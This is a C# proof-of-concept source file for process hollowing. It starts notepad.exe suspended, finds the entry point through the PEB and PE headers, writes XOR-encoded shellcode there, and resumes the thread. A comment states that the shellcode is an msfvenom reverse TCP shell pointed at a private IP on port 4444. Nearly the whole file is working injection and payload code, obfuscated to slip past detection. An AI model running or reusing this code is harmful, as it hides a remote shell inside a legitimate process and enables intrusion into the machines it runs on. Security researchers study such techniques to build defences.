// Process Hollowing POC
// William Moody (@bmdyy)
// 04.01.2023

using System;
using System.Runtime.InteropServices;

namespace ProcHollow
{
	class Program
	{
		// http://www.pinvoke.net/default.aspx/Structures/SECURITY_ATTRIBUTES.html
		[StructLayout(LayoutKind.Sequential)]
		public struct SECURITY_ATTRIBUTES
		{
			public int nLength;
			public IntPtr lpSecurityDescriptor;
			public int bInheritHandle;
		}

		// http://www.pinvoke.net/default.aspx/Structures/STARTUPINFO.html
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		struct STARTUPINFO
		{
			public Int32 cb;
			public string lpReserved;
			public string lpDesktop;
			public string lpTitle;
			public Int32 dwX;
			public Int32 dwY;
			public Int32 dwXSize;
			public Int32 dwYSize;
			public Int32 dwXCountChars;
			public Int32 dwYCountChars;
			public Int32 dwFillAttribute;
			public Int32 dwFlags;
			public Int16 wShowWindow;
			public Int16 cbReserved2;
			public IntPtr lpReserved2;
			public IntPtr hStdInput;
			public IntPtr hStdOutput;
			public IntPtr hStdError;
		}

		// http://www.pinvoke.net/default.aspx/Structures/PROCESS_INFORMATION.html
		[StructLayout(LayoutKind.Sequential)]
		internal struct PROCESS_INFORMATION
		{
			public IntPtr hProcess;
			public IntPtr hThread;
			public int dwProcessId;
			public int dwThreadId;
		}

		// http://www.pinvoke.net/default.aspx/kernel32/CreateProcess.html
		[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
		static extern bool CreateProcess(
			string lpApplicationName,
			string lpCommandLine,
			ref SECURITY_ATTRIBUTES lpProcessAttributes,
			ref SECURITY_ATTRIBUTES lpThreadAttributes,
			bool bInheritHandles,
			uint dwCreationFlags,
			IntPtr lpEnvironment,
			string lpCurrentDirectory,
			[In] ref STARTUPINFO lpStartupInfo,
			out PROCESS_INFORMATION lpProcessInformation
		);

		// http://www.pinvoke.net/default.aspx/kernel32/ResumeThread.html
		[DllImport("kernel32.dll", SetLastError = true)]
		static extern uint ResumeThread(IntPtr hThread);

		// http://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html
		[StructLayout(LayoutKind.Sequential)]
		internal struct PROCESS_BASIC_INFORMATION
		{
			public IntPtr ExitStatus;
			public IntPtr PebAddress;
			public IntPtr AffinityMask;
			public IntPtr BasePriority;
			public IntPtr UniquePID;
			public IntPtr InheritedFromUniqueProcessId;
		}

		[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
		static extern int ZwQueryInformationProcess(
			IntPtr hProcess,
			int procInformationClass,
			ref PROCESS_BASIC_INFORMATION procInformation,
			uint ProcInfoLen, 
			ref uint retlen
		);

		// http://www.pinvoke.net/default.aspx/kernel32/ReadProcessMemory.html
		[DllImport("kernel32.dll", SetLastError = true)]
		static extern bool ReadProcessMemory(
			IntPtr hProcess,
			IntPtr lpBaseAddress,
			[Out] byte[] lpBuffer,
			int dwSize,
			out IntPtr lpNumberOfBytesRead
		);

		// http://www.pinvoke.net/default.aspx/kernel32/WriteProcessMemory.html
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool WriteProcessMemory(
			IntPtr hProcess,
			IntPtr lpBaseAddress,
			byte[] lpBuffer,
			Int32 nSize,
			out IntPtr lpNumberOfBytesWritten
		);

		// https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
		static uint CREATE_SUSPENDED = 0x00000004;

		// https://learn.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
		static int ProcessBasicInformation = 0x00000000;

		static void Main(string[] args)
		{
			// 1 -- Create the target process in a suspended state

			STARTUPINFO si = new STARTUPINFO();
			PROCESS_INFORMATION pi;
			SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();

			CreateProcess(
				"C:\\Windows\\System32\\notepad.exe",
				"",
				ref sa,
				ref sa,
				false,
				CREATE_SUSPENDED,
				IntPtr.Zero,
				null,
				ref si,
				out pi
			);

			Console.WriteLine("[1] Created suspended 'notepad.exe' with ProcId " + pi.dwProcessId);

			// 2 -- Get the address of the Process Environment Block

			PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
			uint retlen = 0;
			ZwQueryInformationProcess(
				pi.hProcess,
				ProcessBasicInformation,
				ref pbi,
				(uint)(IntPtr.Size * 6),
				ref retlen
			);

			Console.WriteLine("[2] PEB is at 0x{0}", pbi.PebAddress.ToString("X"));

			// 3 -- Extract the Image Base Address from the PEB

			byte[] buf1 = new byte[0x8];
			IntPtr numBytesRead = IntPtr.Zero;

			ReadProcessMemory(
				pi.hProcess,
				pbi.PebAddress + 0x10,
				buf1,
				0x8,
				out numBytesRead
			);
			IntPtr imageBaseAddress = (IntPtr)BitConverter.ToInt64(buf1, 0);

			Console.WriteLine("[3] Image Base Address is 0x{0}", imageBaseAddress.ToString("X"));

			// 4 -- Read the PE structure to find the EntryPoint address

			byte[] buf2 = new byte[0x200];

			ReadProcessMemory(
				pi.hProcess,
				imageBaseAddress,
				buf2,
				0x200,
				out numBytesRead
			);

			uint e_lfanew = BitConverter.ToUInt32(buf2, 0x3c);
			uint entryPointRVAOffset = e_lfanew + 0x28;
			uint entryPointRVA = BitConverter.ToUInt32(buf2, (int)entryPointRVAOffset);
			IntPtr entryPointAddr = (IntPtr)((UInt64)imageBaseAddress + entryPointRVA);

			IntPtr entryPoint = IntPtr.Zero;
			Console.WriteLine("[4] Entry Point is 0x{0}", entryPointAddr.ToString("X"));

			// 5 -- Write shellcode at EntryPoint

			// msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=192.168.100.85 -f csharp -v shellcode (ENCODED)
			byte[] shellcode = new byte[460] { 0xca, 0x7e, 0xb5, 0xd2, 0xc6, 0xde, 0xf6, 0x36, 0x36, 0x36, 0x77, 0x67, 0x77, 0x66, 0x64, 0x67, 0x60, 0x7e, 0x07, 0xe4, 0x53, 0x7e, 0xbd, 0x64, 0x56, 0x7e, 0xbd, 0x64, 0x2e, 0x7e, 0xbd, 0x64, 0x16, 0x7e, 0xbd, 0x44, 0x66, 0x7e, 0x39, 0x81, 0x7c, 0x7c, 0x7b, 0x07, 0xff, 0x7e, 0x07, 0xf6, 0x9a, 0x0a, 0x57, 0x4a, 0x34, 0x1a, 0x16, 0x77, 0xf7, 0xff, 0x3b, 0x77, 0x37, 0xf7, 0xd4, 0xdb, 0x64, 0x77, 0x67, 0x7e, 0xbd, 0x64, 0x16, 0xbd, 0x74, 0x0a, 0x7e, 0x37, 0xe6, 0xbd, 0xb6, 0xbe, 0x36, 0x36, 0x36, 0x7e, 0xb3, 0xf6, 0x42, 0x51, 0x7e, 0x37, 0xe6, 0x66, 0xbd, 0x7e, 0x2e, 0x72, 0xbd, 0x76, 0x16, 0x7f, 0x37, 0xe6, 0xd5, 0x60, 0x7e, 0xc9, 0xff, 0x77, 0xbd, 0x02, 0xbe, 0x7e, 0x37, 0xe0, 0x7b, 0x07, 0xff, 0x7e, 0x07, 0xf6, 0x9a, 0x77, 0xf7, 0xff, 0x3b, 0x77, 0x37, 0xf7, 0x0e, 0xd6, 0x43, 0xc7, 0x7a, 0x35, 0x7a, 0x12, 0x3e, 0x73, 0x0f, 0xe7, 0x43, 0xee, 0x6e, 0x72, 0xbd, 0x76, 0x12, 0x7f, 0x37, 0xe6, 0x50, 0x77, 0xbd, 0x3a, 0x7e, 0x72, 0xbd, 0x76, 0x2a, 0x7f, 0x37, 0xe6, 0x77, 0xbd, 0x32, 0xbe, 0x7e, 0x37, 0xe6, 0x77, 0x6e, 0x77, 0x6e, 0x68, 0x6f, 0x6c, 0x77, 0x6e, 0x77, 0x6f, 0x77, 0x6c, 0x7e, 0xb5, 0xda, 0x16, 0x77, 0x64, 0xc9, 0xd6, 0x6e, 0x77, 0x6f, 0x6c, 0x7e, 0xbd, 0x24, 0xdf, 0x61, 0xc9, 0xc9, 0xc9, 0x6b, 0x7f, 0x88, 0x41, 0x45, 0x04, 0x69, 0x05, 0x04, 0x36, 0x36, 0x77, 0x60, 0x7f, 0xbf, 0xd0, 0x7e, 0xb7, 0xda, 0x96, 0x37, 0x36, 0x36, 0x7f, 0xbf, 0xd3, 0x7f, 0x8a, 0x34, 0x36, 0x27, 0x6a, 0xf6, 0x9e, 0x1d, 0x92, 0x77, 0x62, 0x7f, 0xbf, 0xd2, 0x7a, 0xbf, 0xc7, 0x77, 0x8c, 0x7a, 0x41, 0x10, 0x31, 0xc9, 0xe3, 0x7a, 0xbf, 0xdc, 0x5e, 0x37, 0x37, 0x36, 0x36, 0x6f, 0x77, 0x8c, 0x1f, 0xb6, 0x5d, 0x36, 0xc9, 0xe3, 0x66, 0x66, 0x7b, 0x07, 0xff, 0x7b, 0x07, 0xf6, 0x7e, 0xc9, 0xf6, 0x7e, 0xbf, 0xf4, 0x7e, 0xc9, 0xf6, 0x7e, 0xbf, 0xf7, 0x77, 0x8c, 0xdc, 0x39, 0xe9, 0xd6, 0xc9, 0xe3, 0x7e, 0xbf, 0xf1, 0x5c, 0x26, 0x77, 0x6e, 0x7a, 0xbf, 0xd4, 0x7e, 0xbf, 0xcf, 0x77, 0x8c, 0xaf, 0x93, 0x42, 0x57, 0xc9, 0xe3, 0x7e, 0xb7, 0xf2, 0x76, 0x34, 0x36, 0x36, 0x7f, 0x8e, 0x55, 0x5b, 0x52, 0x36, 0x36, 0x36, 0x36, 0x36, 0x77, 0x66, 0x77, 0x66, 0x7e, 0xbf, 0xd4, 0x61, 0x61, 0x61, 0x7b, 0x07, 0xf6, 0x5c, 0x3b, 0x6f, 0x77, 0x66, 0xd4, 0xca, 0x50, 0xf1, 0x72, 0x12, 0x62, 0x37, 0x37, 0x7e, 0xbb, 0x72, 0x12, 0x2e, 0xf0, 0x36, 0x5e, 0x7e, 0xbf, 0xd0, 0x60, 0x66, 0x77, 0x66, 0x77, 0x66, 0x77, 0x66, 0x7f, 0xc9, 0xf6, 0x77, 0x66, 0x7f, 0xc9, 0xfe, 0x7b, 0xbf, 0xf7, 0x7a, 0xbf, 0xf7, 0x77, 0x8c, 0x4f, 0xfa, 0x09, 0xb0, 0xc9, 0xe3, 0x7e, 0x07, 0xe4, 0x7e, 0xc9, 0xfc, 0xbd, 0x38, 0x77, 0x8c, 0x3e, 0xb1, 0x2b, 0x56, 0xc9, 0xe3, 0x8d, 0xc6, 0x83, 0x94, 0x60, 0x77, 0x8c, 0x90, 0xa3, 0x8b, 0xab, 0xc9, 0xe3, 0x7e, 0xb5, 0xf2, 0x1e, 0x0a, 0x30, 0x4a, 0x3c, 0xb6, 0xcd, 0xd6, 0x43, 0x33, 0x8d, 0x71, 0x25, 0x44, 0x59, 0x5c, 0x36, 0x6f, 0x77, 0xbf, 0xec, 0xc9, 0xe3 };

			for (int i = 0; i < shellcode.Length; i++)
			{
				shellcode[i] = (byte)(shellcode[i] ^ 54);
			}

			WriteProcessMemory(
				pi.hProcess,
				entryPointAddr,
				shellcode,
				shellcode.Length,
				out numBytesRead
			);

			Console.WriteLine("[5] Wrote shellcode to Entry Point");

			// 6 -- Resume the target process

			ResumeThread(pi.hThread);

			Console.WriteLine("[6] Resumed process thread");
		}
	}
}
